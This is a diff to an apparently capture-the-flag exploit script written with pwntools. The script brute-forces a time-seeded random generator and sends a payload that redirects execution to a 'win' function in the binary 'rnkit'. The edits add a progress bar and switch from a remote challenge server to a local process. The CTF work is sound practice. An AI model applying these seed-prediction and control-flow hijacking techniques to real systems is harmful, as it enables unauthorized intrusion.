@@ -1,4 +1,4 @@
-import ctypes
+import ctypes, tqdm
 
 # Create a ctypes structure to match the C 'struct timeval'
 class timeval(ctypes.Structure):
@@ -26,7 +26,7 @@ gettimeofday(ctypes.pointer(t), None)
 seed_time = t.tv_sec
 
 def crackSeed(sequence):
-    for i in range(-1000000, 1000000):   # increase the range as necessary
+    for i in tqdm.tqdm(range(-1000000, 1000000)):   # increase the range as necessary
         seed = seed_time + i
         srand(seed)
 
@@ -47,7 +47,7 @@ from pwn import *
 
 exe = context.binary = ELF('./rnkit')
 winaddr = exe.symbols['win']
-io = remote('amt.rs', 31175) #exe.process() # remote('amt.rs', 31175)
+io = exe.process() # remote('amt.rs', 31175)
 
 seq = []
 for i in range(5):
@@ -72,7 +72,7 @@ if 'correct' in resp.decode():
     56: winaddr
     })
     io.sendline(payload)
-    resp = io.recvuntil(b'}')
+    resp = io.recvline()
     print(resp.decode())
 
 else:
